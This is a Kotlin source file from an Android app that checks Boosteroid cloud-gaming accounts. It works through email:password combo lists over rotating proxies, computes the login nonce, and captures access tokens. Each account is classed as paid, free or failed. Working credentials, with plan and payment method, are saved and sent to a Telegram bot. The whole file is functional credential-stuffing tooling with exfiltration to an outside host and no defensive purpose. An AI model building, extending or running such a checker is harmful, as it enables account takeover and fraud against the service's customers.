package com.boosteroid.checker.data.repository

import com.boosteroid.checker.data.db.ResultDao
import com.boosteroid.checker.data.db.ResultEntity
import com.boosteroid.checker.data.prefs.SettingsPrefs
import com.boosteroid.checker.network.NetworkClient
import com.boosteroid.checker.network.ProxyManager
import com.boosteroid.checker.network.models.LoginRequest
import com.boosteroid.checker.utils.NonceCalculator
import com.boosteroid.checker.utils.TelegramNotifier
import kotlinx.coroutines.*
import kotlinx.coroutines.flow.MutableSharedFlow
import kotlinx.coroutines.flow.SharedFlow
import kotlinx.coroutines.sync.Semaphore

data class LogEntry(val message: String, val type: LogType, val timestamp: Long = System.currentTimeMillis())
enum class LogType { INFO, SUCCESS, FAIL, ERROR }
data class CheckerStats(val total: Int = 0, val checked: Int = 0, val paid: Int = 0,
    val free: Int = 0, val failed: Int = 0, val errors: Int = 0)

class CheckerRepository(private val dao: ResultDao, private val prefs: SettingsPrefs, private val proxyManager: ProxyManager) {
    private val _logFlow = MutableSharedFlow<LogEntry>(replay = 0, extraBufferCapacity = 500)
    val logFlow: SharedFlow<LogEntry> = _logFlow
    private val _statsFlow = MutableSharedFlow<CheckerStats>(replay = 1, extraBufferCapacity = 10)
    val statsFlow: SharedFlow<CheckerStats> = _statsFlow
    private var stats = CheckerStats()
    private var isRunning = false
    private var checkerJob: Job? = null

    fun isRunning() = isRunning

    fun startChecking(combos: List<String>, scope: CoroutineScope) {
        if (isRunning) return
        isRunning = true
        stats = CheckerStats(total = combos.size)
        _statsFlow.tryEmit(stats)
        if (prefs.useProxy) {
            val parsed = prefs.proxyList.lines().mapNotNull { proxyManager.parseProxyLine(it) }
            proxyManager.setProxies(parsed)
            log("Loaded ${proxyManager.size()} proxies", LogType.INFO)
        }
        checkerJob = scope.launch {
            val sem = Semaphore(prefs.threads)
            combos.map { combo ->
                launch { sem.acquire(); try { if (isActive) checkAccount(combo) } finally { sem.release() } }
            }.joinAll()
            isRunning = false
            log("✅ Done! Paid: ${stats.paid} | Free: ${stats.free} | Failed: ${stats.failed}", LogType.INFO)
        }
    }

    fun stopChecking() { checkerJob?.cancel(); isRunning = false }

    private suspend fun checkAccount(combo: String) {
        val parts = combo.split(":")
        if (parts.size < 2) { log("⚠️ Invalid: $combo", LogType.ERROR); updateStats { copy(checked = checked + 1, errors = errors + 1) }; return }
        val email = parts[0].trim(); val password = parts.drop(1).joinToString(":").trim()
        log("🔄 Checking: $email", LogType.INFO)
        var attempt = 0; var success = false
        while (attempt <= prefs.retries && !success) {
            try {
                val result = performCheck(email, password); success = true
                dao.insert(ResultEntity(email = email, password = password, status = result.first,
                    planType = result.second, autoRenew = result.third, paymentMethod = result.fourth))
                when (result.first) {
                    "PAID" -> {
                        log("✅ PAID | $email:$password | Plan: ${result.second} | AutoRenew: ${result.third}", LogType.SUCCESS)
                        updateStats { copy(checked = checked + 1, paid = paid + 1) }
                        if (prefs.telegramEnabled) TelegramNotifier.send(prefs.telegramBotToken, prefs.telegramChatId,
                            TelegramNotifier.buildResultMessage(email, password, "PAID", result.second, result.third, result.fourth))
                    }
                    "FREE" -> {
                        log("🟡 FREE | $email:$password", LogType.SUCCESS); updateStats { copy(checked = checked + 1, free = free + 1) }
                        if (prefs.telegramEnabled) TelegramNotifier.send(prefs.telegramBotToken, prefs.telegramChatId,
                            TelegramNotifier.buildResultMessage(email, password, "FREE", null, null, null))
                    }
                    else -> { log("❌ FAIL | $email", LogType.FAIL); updateStats { copy(checked = checked + 1, failed = failed + 1) } }
                }
            } catch (e: CancellationException) { throw e
            } catch (e: Exception) {
                attempt++
                if (attempt > prefs.retries) {
                    log("⚠️ ERROR | $email | ${e.message}", LogType.ERROR)
                    updateStats { copy(checked = checked + 1, errors = errors + 1) }
                    dao.insert(ResultEntity(email = email, password = password, status = "ERROR", planType = null, autoRenew = null, paymentMethod = null))
                } else { log("🔁 Retry $attempt | $email", LogType.INFO); delay(1000L * attempt) }
            }
        }
    }

    private suspend fun performCheck(email: String, password: String): Quad<String, String?, String?, String?> =
        withContext(Dispatchers.IO) {
            val proxy = if (prefs.useProxy && prefs.rotateProxies) proxyManager.next() else null
            val api = NetworkClient.buildApiService(prefs.timeoutSeconds.toLong(), proxy,
                if (prefs.useProxy && !prefs.rotateProxies && proxy == null) proxyManager else null)
            val nonce = withContext(Dispatchers.Default) { NonceCalculator.calculate(email.lowercase() + password) }
            if (nonce == -1) throw Exception("Nonce failed")
            val loginResp = api.login(nonce = nonce.toString(), body = LoginRequest(email = email, password = password))
            var accessToken: String? = null; var boosteroidAuth: String? = null
            loginResp.headers().values("Set-Cookie").forEach { cookie ->
                when { cookie.startsWith("access_token=") -> accessToken = cookie.substringAfter("access_token=").substringBefore(";")
                       cookie.startsWith("boosteroid_auth=") -> boosteroidAuth = cookie.substringAfter("boosteroid_auth=").substringBefore(";") }
            }
            if (accessToken == null) accessToken = loginResp.body()?.data?.accessToken
            if (loginResp.code() == 422 || accessToken == null) return@withContext Quad("FAIL", null, null, null)
            val subResp = api.getSubscriptions(authorization = accessToken!!, authData = boosteroidAuth ?: "")
            val subData = subResp.body()?.data
            if (subData.isNullOrEmpty()) return@withContext Quad("FREE", null, null, null)
            val sub = subData.firstOrNull()
            if (sub?.isActive == true) Quad("PAID", sub.title, sub.isAutoRenewal?.toString(), sub.paymentSystemTitle)
            else Quad("FREE", sub?.title, sub?.isAutoRenewal?.toString(), sub?.paymentSystemTitle)
        }

    private fun log(msg: String, type: LogType) { _logFlow.tryEmit(LogEntry(msg, type)) }
    private fun updateStats(update: CheckerStats.() -> CheckerStats) { stats = stats.update(); _statsFlow.tryEmit(stats) }
    data class Quad<A, B, C, D>(val first: A, val second: B, val third: C, val fourth: D)
}
